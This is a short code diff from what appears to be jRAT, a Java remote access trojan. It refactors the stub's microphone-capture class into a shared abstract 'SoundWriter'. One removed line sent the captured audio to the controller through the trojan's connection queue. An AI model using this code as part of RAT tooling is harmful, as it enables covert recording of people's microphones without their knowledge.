@@ -1,23 +1,20 @@
-package se.jrat.stub;
+package se.jrat.common;
 
 import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.TargetDataLine;
 
-import se.jrat.stub.packets.outgoing.Packet58SoundCapture;
+public abstract class SoundWriter implements Runnable {
 
-
-public class Sound implements Runnable {
-
-	public static Sound instance;
+	public static SoundWriter instance;
 
 	private AudioFormat format;
 	private DataLine.Info info;
 	private TargetDataLine line;
 	public boolean running;
 
-	public Sound() {
+	public SoundWriter() {
 		instance = this;
 	}
 
@@ -48,12 +45,14 @@ public class Sound implements Runnable {
 
 				int read = line.read(data, 0, data.length);
 
-				Connection.instance.addToSendQueue(new Packet58SoundCapture(data, read));
+				onRead(data, read);
 			}
 			disable();
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
+
+	public abstract void onRead(byte[] data, int read) throws Exception;
 
 }
